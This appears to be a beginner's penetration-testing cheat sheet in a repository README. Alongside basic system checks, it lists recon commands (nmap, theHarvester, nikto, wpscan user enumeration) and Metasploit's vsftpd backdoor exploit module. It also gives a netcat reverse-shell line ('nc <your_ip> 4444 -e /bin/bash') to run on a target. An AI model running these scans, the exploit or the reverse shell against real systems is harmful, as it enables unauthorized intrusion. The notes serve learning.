# first-repository-
# View login attempts
last

# View authentication logs
sudo cat /var/log/auth.log

# List firewall rules
sudo ufw status
# See your IP address (Linux)
ip a

# Check if a host is reachable
ping google.com

# Get DNS info for a domain
nslookup example.com

# Basic network info (hostname, routes, etc.)
hostname
route
# Whois lookup for domain info
whois example.com

# Simple DNS query
dig example.com

# Search for email addresses linked to a domain
theHarvester -d example.com -b google
# Quick scan for open ports
nmap <target_ip>

# More detailed scan
nmap -sV <target_ip>

# Scan a website
nmap -p 80,443 example.com
# List shared folders and users (Linux target)
smbclient -L //<target_ip>/ -U guest

# Web server analysis
curl -I http://<target_ip>
# Basic web scan
nikto -h http://<target_ip>

# WordPress scan (if applicable)
wpscan --url http://<target_ip> --enumerate u
# Start Metasploit Framework
msfconsole

# Search for vulnerabilities
search vsftpd

# Load exploit module
use exploit/unix/ftp/vsftpd_234_backdoor

# Set the target IP
set RHOSTS <target_ip>
# Start a listener on your machine
nc -lvnp 4444

# On the target: connect back (if allowed)
nc <your_ip> 4444 -e /bin/bash
# See all running processes
ps aux

# See all network connections
netstat -tuln

# List files in a directory
ls -l
